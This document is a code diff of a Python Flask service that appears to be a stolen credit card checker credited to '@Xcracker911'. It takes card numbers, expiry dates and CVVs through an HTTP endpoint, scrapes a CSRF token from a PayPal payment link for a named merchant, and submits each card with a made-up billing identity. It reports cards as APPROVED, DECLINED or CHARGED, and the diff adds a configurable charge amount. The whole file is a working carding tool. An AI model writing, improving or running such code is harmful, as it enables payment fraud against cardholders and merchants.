@@ -3,7 +3,8 @@ import json
 import logging
 import re
 import time
-from flask import Flask, jsonify
+from flask import Flask, jsonify, request
+import datetime
 
 # Configure logging
 logging.basicConfig(
@@ -24,11 +25,11 @@ DECLINED_CODES = {
     "VALIDATION_ERROR",
     "LOGIN_ERROR",
     "RISK_DISALLOWED",
-    "TOKEN_EXTRACTION_ERROR",  # Added
-    "NETWORK_ERROR",           # Added
-    "INTERNAL_ERROR",          # Added
-    "INVALID_MONTH",           # Added
-    "UNKNOWN_ERROR"            # Added
+    "TOKEN_EXTRACTION_ERROR",
+    "NETWORK_ERROR",
+    "INTERNAL_ERROR",
+    "INVALID_MONTH",
+    "UNKNOWN_ERROR"
 }
 
 def extract_csrf_token(html_content):
@@ -54,27 +55,64 @@ def extract_csrf_token(html_content):
         logging.error(f"Error extracting CSRF token: {e}")
         return None
 
-def process_paypal_payment(card_details_string):
+def process_paypal_payment(card_details_string, amount="1.00"):
     """
     Processes the PayPal payment using the provided card details string.
     The string should be in the format: 'card_number|mm|yy|cvv'
-    Returns a dictionary with 'code' and 'message' from the PayPal response.
+    Returns a dictionary with processing results including timing.
     """
+    start_time = time.time()
+    
     # --- 1. Parse and Validate Card Details ---
     parts = card_details_string.split('|')
     if len(parts) != 4:
-        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid input format. Expected: card_number|mm|yy|cvv'}
+        return {
+            'result': 'DECLINED|VALIDATION_ERROR: R_ERROR-0.01',
+            'amount': amount,
+            'dev': '@Xcracker911',
+            'time': '0.00s',
+            'timestamp': int(time.time())
+        }
 
     card_number, month, year, cvv = [p.strip() for p in parts]
 
     if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
-        return {'code': 'INVALID_MONTH', 'message': 'Invalid expiration month provided.'}
+        return {
+            'result': 'DECLINED|INVALID_MONTH: R_ERROR-0.01',
+            'amount': amount,
+            'dev': '@Xcracker911',
+            'time': '0.00s',
+            'timestamp': int(time.time())
+        }
+    
     if not year.isdigit():
-        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
-    if len(year) == 2: year = '20' + year
-    elif len(year) != 4: return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
+        return {
+            'result': 'DECLINED|VALIDATION_ERROR: R_ERROR-0.01',
+            'amount': amount,
+            'dev': '@Xcracker911',
+            'time': '0.00s',
+            'timestamp': int(time.time())
+        }
+    
+    if len(year) == 2: 
+        year = '20' + year
+    elif len(year) != 4: 
+        return {
+            'result': 'DECLINED|VALIDATION_ERROR: R_ERROR-0.01',
+            'amount': amount,
+            'dev': '@Xcracker911',
+            'time': '0.00s',
+            'timestamp': int(time.time())
+        }
+    
     if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
-        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid CVV format.'}
+        return {
+            'result': 'DECLINED|VALIDATION_ERROR: R_ERROR-0.01',
+            'amount': amount,
+            'dev': '@Xcracker911',
+            'time': '0.00s',
+            'timestamp': int(time.time())
+        }
 
     expiry_date = f"{month}/{year}"
     card_type = 'VISA' if card_number.startswith('4') else ('MASTER_CARD' if card_number.startswith('5') else ('AMEX' if card_number.startswith('3') else 'UNKNOWN'))
@@ -118,17 +156,25 @@ def process_paypal_payment(card_details_string):
                 time.sleep(3)
                 continue
             else:
-                return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract CSRF token from PayPal after multiple retries.'}
+                end_time = time.time()
+                processing_time = f"{end_time - start_time:.2f}s"
+                return {
+                    'result': 'DECLINED|TOKEN_EXTRACTION_ERROR: R_ERROR-0.01',
+                    'amount': amount,
+                    'dev': '@Xcracker911',
+                    'time': processing_time,
+                    'timestamp': int(time.time())
+                }
 
         # --- Request 2: Create Order ---
         headers = {
             'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
             'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'x-csrf-token': csrf_token, # Use the dynamically extracted token
+            'x-csrf-token': csrf_token,
         }
         json_data = {
-            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1', # Note: amount is 1 here
+            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': amount,
             'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD',
             'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
         }
@@ -143,14 +189,30 @@ def process_paypal_payment(card_details_string):
                 time.sleep(3)
                 continue
             else:
-                return {'code': 'NETWORK_ERROR', 'message': 'Failed to connect to PayPal create-order API.'}
+                end_time = time.time()
+                processing_time = f"{end_time - start_time:.2f}s"
+                return {
+                    'result': 'DECLINED|NETWORK_ERROR: R_ERROR-0.01',
+                    'amount': amount,
+                    'dev': '@Xcracker911',
+                    'time': processing_time,
+                    'timestamp': int(time.time())
+                }
         except ValueError:
             logging.error(f"Invalid JSON response from create-order on acquisition try {acquisition_attempt + 1}: {response.text}")
             if acquisition_attempt < max_acquisition_retries - 1:
                 time.sleep(3)
                 continue
             else:
-                return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'PayPal returned an invalid JSON response.'}
+                end_time = time.time()
+                processing_time = f"{end_time - start_time:.2f}s"
+                return {
+                    'result': 'DECLINED|TOKEN_EXTRACTION_ERROR: R_ERROR-0.01',
+                    'amount': amount,
+                    'dev': '@Xcracker911',
+                    'time': processing_time,
+                    'timestamp': int(time.time())
+                }
         
         if 'context_id' in response_data:
             token = response_data['context_id']
@@ -165,7 +227,15 @@ def process_paypal_payment(card_details_string):
 
     if not token:
         logging.error(f"Failed to extract token after {max_acquisition_retries} full acquisition attempts.")
-        return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract token from PayPal response after multiple retries.'}
+        end_time = time.time()
+        processing_time = f"{end_time - start_time:.2f}s"
+        return {
+            'result': 'DECLINED|TOKEN_EXTRACTION_ERROR: R_ERROR-0.01',
+            'amount': amount,
+            'dev': '@Xcracker911',
+            'time': processing_time,
+            'timestamp': int(time.time())
+        }
 
     # --- Request 3: Submit Card Details ---
     headers = {
@@ -176,7 +246,6 @@ def process_paypal_payment(card_details_string):
         'x-app-name': 'standardcardfields', 'x-country': 'US',
     }
 
-    # --- FIX: The complete, correctly formatted GraphQL query ---
     graphql_query = """
     mutation payWithCard(
         $token: String!
@@ -241,7 +310,7 @@ def process_paypal_payment(card_details_string):
     json_data = {
         'query': graphql_query.strip(),
         'variables': {
-            'token': token, 'card': card_details, 'phoneNumber': '4073320637', # Note: phone number is different
+            'token': token, 'card': card_details, 'phoneNumber': '4073320637',
             'firstName': 'Rockcy', 'lastName': 'og',
             'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
             'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
@@ -254,38 +323,64 @@ def process_paypal_payment(card_details_string):
         response_data = response.json()
     except (ValueError, requests.exceptions.RequestException) as e:
         logging.error(f"Final GraphQL request failed: {e}. Response: {response.text}")
-        return {'code': 'INTERNAL_ERROR', 'message': 'Failed to submit payment to PayPal.'}
+        end_time = time.time()
+        processing_time = f"{end_time - start_time:.2f}s"
+        return {
+            'result': 'DECLINED|INTERNAL_ERROR: R_ERROR-0.01',
+            'amount': amount,
+            'dev': '@Xcracker911',
+            'time': processing_time,
+            'timestamp': int(time.time())
+        }
 
-    # --- 3. Parse PayPal Response ---
-    result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}
+    # --- 3. Parse PayPal Response and Format Result ---
+    end_time = time.time()
+    processing_time = f"{end_time - start_time:.2f}s"
+    
+    result_code = 'TRANSACTION_SUCCESSFUL'
+    result_message = 'Payment processed successfully.'
+    
     if 'errors' in response_data and response_data['errors']:
         logging.error(f"PayPal GraphQL error: {json.dumps(response_data)}")
         error_data = response_data['errors'][0]
-        result['code'] = error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
-        result['message'] = error_data.get('message', 'An unknown error occurred.')
+        result_code = error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
+        result_message = error_data.get('message', 'An unknown error occurred.')
     
-    return result
+    # Format the result according to your desired output
+    if result_code in APPROVED_CODES:
+        status = 'APPROVED'
+    elif result_code in DECLINED_CODES:
+        status = 'DECLINED'
+    else:
+        status = 'CHARGED'
+    
+    result_string = f"{status}|{result_code}: R_ERROR-{amount}"
+    
+    return {
+        'amount': amount,
+        'dev': '@Xcracker911',
+        'result': result_string,
+        'time': processing_time,
+        'timestamp': int(time.time())
+    }
 
 
-@app.route('/gate=pp1/cc=<card_details>')
-def payment_gateway(card_details):
+@app.route('/pp')
+def payment_gateway():
     """
     Main endpoint to process a payment.
-    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}
+    URL Format: /pp?cc=card_number|mm|yy|cvv&amount=0.01
     """
+    card_details = request.args.get('cc', '')
+    amount = request.args.get('amount', '0.01')
+    
     last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
-    logging.info(f"Received payment request for card ending in {last_four}")
+    logging.info(f"Received payment request for card ending in {last_four}, amount: {amount}")
     
-    result = process_paypal_payment(card_details)
+    result = process_paypal_payment(card_details, amount)
     
-    code = result.get('code')
-    if code in APPROVED_CODES: status = 'approved'
-    elif code in DECLINED_CODES: status = 'declined'
-    else: status = 'charged'
-
-    final_response = {"status": status, "code": code, "message": result.get('message')}
-    logging.info(f"Transaction result: {final_response}")
-    return jsonify(final_response)
+    logging.info(f"Transaction result: {result}")
+    return jsonify(result)
 
 
 if __name__ == '__main__':
